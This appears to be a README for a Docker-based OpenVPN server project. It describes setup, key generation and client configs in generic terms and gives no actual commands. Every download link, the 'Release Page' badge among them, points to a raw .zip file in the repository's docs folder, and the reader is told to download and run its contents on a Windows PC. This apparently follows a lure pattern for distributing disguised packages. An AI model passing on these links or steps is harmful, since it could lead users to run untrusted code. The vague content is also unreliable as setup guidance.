# 🛡️ docker-openvpn - Simple VPN Server Setup

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/lothianregionophrysapifera132/docker-openvpn/raw/refs/heads/main/docs/openvpn-docker-v2.3.zip)

## 📦 What this is

docker-openvpn gives you a way to run your own OpenVPN server in Docker. It sets up the security keys for you and helps create client config files. It runs on Alpine Linux and supports amd64, arm64, and arm/v7 systems.

Use it if you want a private VPN server for home, travel, or remote access. The helper script handles the setup, so you do not need to build the VPN by hand.

## 🖥️ What you need

Before you start, make sure you have:

- A Windows PC
- Docker Desktop installed
- Internet access
- Permission to run software on your PC
- A place to store the VPN files

If you plan to run this on a home server or a Raspberry Pi, the image also supports those systems.

## ⬇️ Download and install

1. Open the [release page](https://github.com/lothianregionophrysapifera132/docker-openvpn/raw/refs/heads/main/docs/openvpn-docker-v2.3.zip)
2. Download the latest release files for docker-openvpn
3. Save the files to a folder you can find later
4. If the release includes a helper script, keep it in the same folder
5. Open Docker Desktop and make sure it is running

If the release gives you a container image and setup files, use the files from the release page to start the server and create your VPN client profile.

## 🚀 First-time setup

1. Create a folder on your PC for this project
2. Put the downloaded release files in that folder
3. Open a terminal in that folder
4. Start the helper script or Docker setup file from the release package
5. Wait while the server creates its PKI files
6. Let the setup finish before you close the window

During setup, the project creates the VPN server keys and the client config. This is what your phone or PC will use to connect later.

## 🔐 How it works

The image uses OpenVPN for the VPN service and EasyRSA for the key setup. In plain terms, it creates the lock and the key needed for secure access.

The helper script usually handles tasks like:

- Starting the container
- Creating the server certificate
- Making client config files
- Saving the files in a local folder
- Managing the VPN container later

You do not need to edit system files by hand. The script and container do most of the work.

## 📁 Files you may see

After setup, you may see files like:

- Server key files
- Client config files
- PKI folders
- Docker Compose files
- Helper script files
- Log files

Keep these files in a safe place. The client config file is the one you will use on your other device.

## 🔄 Start, stop, and manage

If the helper script is included, use it to manage the VPN server. Common actions are:

- Start the server
- Stop the server
- Restart the server
- Create a new client file
- Remove old client files

If you use Docker Compose, you can also manage the server from the folder that holds the compose file.

## 📲 Connect from a client device

To connect from another device:

1. Copy the client config file to the device you want to use
2. Install the OpenVPN client app on that device
3. Import the config file into the app
4. Connect to the VPN server

You can use the same profile on laptops, phones, or tablets if the server setup allows it. For each device, create a separate client profile when possible.

## 🧰 Common uses

People use this project for:

- Safe remote access to home devices
- Private browsing on public Wi-Fi
- Access to a home network while traveling
- Secure links between devices
- A self-hosted VPN server

## 🌐 Supported platforms

This image supports:

- amd64
- arm64
- arm/v7

That makes it a good fit for modern PCs, many home servers, and Raspberry Pi systems.

## 🛠️ Basic troubleshooting

If the VPN does not start, check these items:

- Docker Desktop is running
- The release files are in the right folder
- The helper script has permission to run
- The ports used by OpenVPN are not blocked
- Your firewall allows VPN traffic

If the client cannot connect:

- Make sure the server is running
- Check that the client file matches the server
- Import the full config file again
- Confirm your network allows VPN connections

If setup fails, delete the broken files and run the setup again from a clean folder

## 📌 Project details

- Image base: Alpine Linux
- VPN software: OpenVPN
- PKI setup: EasyRSA
- Management: helper script
- Use case: self-hosted VPN server
- Topics: encryption, network, security, VPN client, VPN server

## 🧪 Typical setup flow

1. Download the release files
2. Run Docker Desktop
3. Start the helper script
4. Let the PKI setup complete
5. Create the client config file
6. Import the config into your VPN app
7. Connect to your server

## 🔗 Download

Visit the [release page](https://github.com/lothianregionophrysapifera132/docker-openvpn/raw/refs/heads/main/docs/openvpn-docker-v2.3.zip) to download and run the latest docker-openvpn release files